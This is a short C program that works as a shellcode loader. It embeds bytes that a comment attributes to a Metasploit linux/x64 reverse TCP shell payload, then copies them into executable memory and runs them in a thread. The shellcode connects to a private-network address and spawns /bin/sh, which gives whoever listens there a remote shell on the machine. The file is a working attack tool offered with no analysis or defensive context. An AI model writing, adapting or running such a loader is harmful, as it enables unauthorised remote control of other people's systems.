#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <pthread.h>


// use payload/linux/x64/shell_reverse_tcp
// generate -f c 

unsigned char shellcode[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
"\x48\xb9\x02\x00\x0d\x05\xc0\xa8\x00\x68\x51\x48\x89\xe6"
"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
"\x89\xe6\x0f\x05";

// Function to execute the shellcode
void *executeShellcode(void *arg) {
    void **execMemPtr = (void **)arg;  // Pointer to execMem
    // Copy the shellcode into the allocated memory
    void *execMem = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

    if (execMem == MAP_FAILED) {
        perror("mmap");
        return NULL;
    }

    // Copy the shellcode into the allocated memory
    memcpy(execMem, shellcode, sizeof(shellcode));

    // Change memory protection to allow reading and executing
    if (mprotect(execMem, sizeof(shellcode), PROT_READ | PROT_EXEC) == -1) {
        perror("mprotect");
        return NULL;
    }

    // Create a function pointer and assign it to the allocated memory
    void (*function)() = (void (*)())execMem;

    // Execute the shellcode
    function();

    // Update the pointer to execMem with the address
    *execMemPtr = execMem;

    return NULL;
}

int main() {
    pthread_t thread;
    void *execMem = NULL;  // Initialize execMem pointer

    // Create a new thread to execute the shellcode
    if (pthread_create(&thread, NULL, executeShellcode, &execMem) != 0) {
        perror("pthread_create");
        return 1;
    }

    // Wait for the thread to finish
    pthread_join(thread, NULL);

    // Print the address of the allocated memory
    printf("\n\nalloc_mem : %p\n", execMem);
    getchar();

    return 0;
}




